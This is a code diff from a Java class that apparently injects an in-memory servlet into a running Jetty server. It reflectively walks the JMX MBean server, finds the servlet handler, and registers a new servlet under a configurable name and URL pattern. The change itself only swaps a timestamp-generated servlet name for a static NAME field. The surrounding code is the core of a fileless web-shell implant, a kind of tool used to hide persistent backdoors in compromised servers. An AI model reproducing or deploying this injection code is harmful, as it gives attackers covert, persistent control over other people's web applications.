@@ -19,10 +19,10 @@ public class JSMSFromJMX implements Servlet {
 
 	public static String pattern;
 
+	public static String NAME;
+
 	static {
 		try {
-			String servletName = String.valueOf(System.nanoTime());
-
 			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
 			Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
@@ -57,7 +57,7 @@ public class JSMSFromJMX implements Servlet {
 						field = o.getClass().getSuperclass().getDeclaredField("_name");
 						field.setAccessible(true);
 						String name = (String) field.get(o);
-						if (name.equals(servletName)) {
+						if (name.equals(NAME)) {
 							flag = true;
 							break;
 						}
@@ -83,7 +83,7 @@ public class JSMSFromJMX implements Servlet {
 							holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
 						}
 
-						holder.getClass().getMethod("setName", String.class).invoke(holder, servletName);
+						holder.getClass().getMethod("setName", String.class).invoke(holder, NAME);
 						Servlet servlet = new JSMSFromJMX();
 						holder.getClass().getMethod("setServlet", Servlet.class).invoke(holder, servlet);
 						handler.getClass().getMethod("addServlet", holder.getClass()).invoke(handler, holder);
@@ -101,7 +101,7 @@ public class JSMSFromJMX implements Servlet {
 							servletMapping = clazz.newInstance();
 						}
 
-						servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
+						servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, NAME);
 						servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{pattern}});
 						handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
 					}
